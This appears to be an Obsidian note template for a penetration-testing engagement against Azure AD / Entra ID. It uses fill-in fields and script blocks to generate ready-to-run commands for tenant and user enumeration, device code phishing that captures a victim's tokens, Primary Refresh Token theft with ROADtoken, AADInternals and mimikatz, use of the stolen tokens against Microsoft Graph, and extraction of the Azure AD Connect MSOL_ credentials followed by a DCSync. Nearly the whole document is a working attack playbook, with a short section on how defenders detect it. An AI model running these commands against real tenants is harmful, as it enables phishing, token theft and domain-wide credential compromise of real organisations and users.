---
# Attack-specific fields
tenant_id:
tenant_domain:
aad_username:
aad_password:
aad_client_id:
prt_cookie:
device_id:
refresh_token:
access_token:
target_resource: https://graph.microsoft.com
notes:
---

# Azure AD / Entra ID Attacks

> [!abstract] Attack Summary
> Azure AD (now Entra ID) extends on-prem AD into the cloud. Key attack paths include: **PRT (Primary Refresh Token) theft** for SSO bypass, **device code phishing** for token capture without credentials, **Conditional Access bypass**, **service principal abuse**, and **hybrid identity attacks** (Azure AD Connect, Pass-Through Auth). Synced accounts bridge on-prem and cloud.

---

## Baseline (from [[00 - Engagement Baseline]])

```dataviewjs
const b = dv.page("Templates/New Templates/00 - Engagement Baseline");
dv.table(["Field", "Value"], [
  ["Domain",   b?.domain   ?? "—"],
  ["DC IP",    b?.dc_ip    ?? "—"],
  ["Username", b?.username ?? "—"],
  ["OS Env",   b?.os_env   ?? "—"],
]);
```

---

## Attack-Specific Configuration

```dataviewjs
const p = dv.current();
dv.table(["Field", "Value"], [
  ["Tenant ID",          `\`INPUT[text:tenant_id]\``],
  ["Tenant Domain",      `\`INPUT[text:tenant_domain]\``],
  ["AAD Username (UPN)", `\`INPUT[text:aad_username]\``],
  ["AAD Password",       `\`INPUT[text:aad_password]\``],
  ["Target Resource",    `\`INPUT[text(defaultValue("${p.target_resource ?? 'https://graph.microsoft.com'}")):target_resource]\``],
]);
```

---

## Step 1 — Enumerate Tenant Information

```dataviewjs
const p = dv.current();
const tenant = p?.tenant_domain || "TARGET.onmicrosoft.com";
dv.paragraph("```bash\n# Get tenant ID from domain\ncurl 'https://login.microsoftonline.com/" + tenant + "/.well-known/openid-configuration' | python3 -m json.tool | grep tenant_id\n\n# Enumerate tenant details\npython3 -m roadrecon gather --username USER@" + tenant + " --password PASSWORD\n\n# AADInternals\nImport-Module AADInternals\nGet-AADIntLoginInformation -Domain " + tenant + "\n\n# Get all tenant domains\nInvoke-AADIntReconAsOutsider -DomainName " + tenant + "\n```");
```

Tenant ID: `INPUT[text:tenant_id]` | Domain: `INPUT[text:tenant_domain]`

---

## Step 2 — User Enumeration (Unauthenticated)

```dataviewjs
const p = dv.current();
const tenant = p?.tenant_domain || "tenant.onmicrosoft.com";
dv.paragraph("```bash\n# Username enumeration via login endpoint\npython3 o365spray.py --validate --domain " + tenant + " --output valid_users.txt\n\n# Via AADInternals (timing-based)\nInvoke-AADIntUserEnumerationAsOutsider -UserName 'user@" + tenant + "'\n\n# Bulk enumeration\n$users = Get-Content users.txt\n$users | ForEach-Object { Invoke-AADIntUserEnumerationAsOutsider -UserName \"$_@" + tenant + "\" }\n\n# Microsoft Teams enumeration\nInvoke-AADIntTeamsUserEnumeration -UserName 'user@" + tenant + "'\n```");
```

---

## Step 3 — Device Code Phishing

> [!info] Trick a user into authenticating via a device code flow — you receive their token without needing their password.

```dataviewjs
dv.paragraph("```bash\n# Step 1: Request device code\ncurl -X POST 'https://login.microsoftonline.com/common/oauth2/v2.0/devicecode' \\\n  -d 'client_id=d3590ed6-52b3-4102-aeff-aad2292ab01c&scope=openid profile offline_access https://graph.microsoft.com/.default'\n\n# Step 2: Send the user_code to the victim and have them visit:\n# https://microsoft.com/devicelogin\n\n# Step 3: Poll for token (while victim authenticates)\ncurl -X POST 'https://login.microsoftonline.com/common/oauth2/v2.0/token' \\\n  -d 'client_id=d3590ed6-52b3-4102-aeff-aad2292ab01c&grant_type=urn:ietf:params:oauth:grant-type:device_code&device_code=DEVICE_CODE'\n\n# Automated: TokenTactics / AADInternals\nImport-Module TokenTactics\nGet-AzureToken -Client MSGraph\n\n# Or roadtools\npython3 -m roadlib.auth device_code\n```");
```

Refresh Token: `INPUT[text:refresh_token]`
Access Token: `INPUT[text:access_token]`

---

## Step 4 — PRT (Primary Refresh Token) Theft

> [!info] PRTs allow SSO on Entra-joined/registered devices. Stealing a PRT gives seamless access to all SSO resources without MFA prompts.

**Windows — Extract PRT with ROADtoken / AADInternals**
```dataviewjs
dv.paragraph("```bash\n# Requires code execution on the victim's device\n# Extract PRT using ROADtoken\nexecute-assembly C:\\Tools\\ROADtoken\\ROADtoken.exe\n\n# Or via AADInternals\nImport-Module AADInternals\nGet-AADIntUserPRTToken\n\n# Mimikatz (if available)\nts::prt\n\n# Output: nonce + PRT cookie\n# Use the PRT cookie to get tokens for any resource\n```");
```

**Convert PRT to Access Token**
```dataviewjs
const p = dv.current();
const prtCookie = p?.prt_cookie || "PRT_COOKIE";
const resource  = p?.target_resource || "https://graph.microsoft.com";
dv.paragraph("```bash\n# Exchange PRT for access token\ncurl -s 'https://login.microsoftonline.com/common/oauth2/token' \\\n  -H 'Cookie: x-ms-RefreshTokenCredential=" + prtCookie + "' \\\n  -d 'grant_type=urn:ietf:params:oauth:grant-type:jwt-bearer&request=SIGNED_NONCE'\n\n# Via AADInternals\nGet-AADIntAccessTokenForMSGraph -PRTToken '" + prtCookie + "'\n\n# Via roadtools\npython3 -m roadtx interactiveauth --prt-cookie '" + prtCookie + "'\n```");
```

PRT Cookie: `INPUT[text:prt_cookie]`

---

## Step 5 — Access Resources with Token

```dataviewjs
const p = dv.current();
const accessToken = p?.access_token || "ACCESS_TOKEN";
const resource    = p?.target_resource || "https://graph.microsoft.com";
dv.paragraph("```bash\n# Query Microsoft Graph\ncurl -H 'Authorization: Bearer " + accessToken + "' 'https://graph.microsoft.com/v1.0/me'\ncurl -H 'Authorization: Bearer " + accessToken + "' 'https://graph.microsoft.com/v1.0/users'\ncurl -H 'Authorization: Bearer " + accessToken + "' 'https://graph.microsoft.com/v1.0/groups'\n\n# List all users\ncurl -H 'Authorization: Bearer " + accessToken + "' 'https://graph.microsoft.com/v1.0/users?$select=displayName,userPrincipalName,jobTitle'\n\n# via AADInternals\nGet-AADIntUsers -AccessToken '" + accessToken + "'\n\n# via AzureHound (BloodHound for Azure)\nazurehound -j '" + accessToken + "' list\n```");
```

---

## Step 6 — Hybrid Identity Attacks (Azure AD Connect)

> [!info] If Azure AD Connect is deployed, the **MSOL_** account has DCSync rights in on-prem AD. Compromising it = DCSync + cloud access.

```dataviewjs
const b = dv.page("Templates/New Templates/00 - Engagement Baseline");
const domain = b?.domain ?? "DOMAIN";
const dc_ip  = b?.dc_ip  ?? "DC_IP";
dv.paragraph("```bash\n# Find the MSOL account\nexecute-assembly C:\\Tools\\ADSearch\\ADSearch\\bin\\Release\\ADSearch.exe --search '(samaccountname=MSOL_*)' --attributes samaccountname,description\n\n# Extract MSOL_ account creds from Azure AD Connect server\n# Requires admin on the AAD Connect server\n# Tools: AADConnect password extraction script\nImport-Module AADInternals\nGet-AADIntSyncCredentials\n\n# Then DCSync with the MSOL_ account\nimpacket-secretsdump " + domain + "/MSOL_ACCOUNT:'PASSWORD'@" + dc_ip + "\n```");
```

---

## OPSEC

> [!warning] Detection Indicators
> - Device code phishing: Unusual login locations or unexpected device registrations in Entra ID sign-in logs.
> - PRT theft: Sign-in from unfamiliar device, Sign-in Risk events in Identity Protection.
> - Token theft: Impossible travel alerts, unknown application IDs.
> - Graph API queries: Microsoft Sentinel / Defender for Cloud Apps anomaly alerts.
> - MSOL_ account DCSync: Same as standard DCSync — **Event 4662** on DC.

---

## Notes & Results

`INPUT[textarea:notes]`
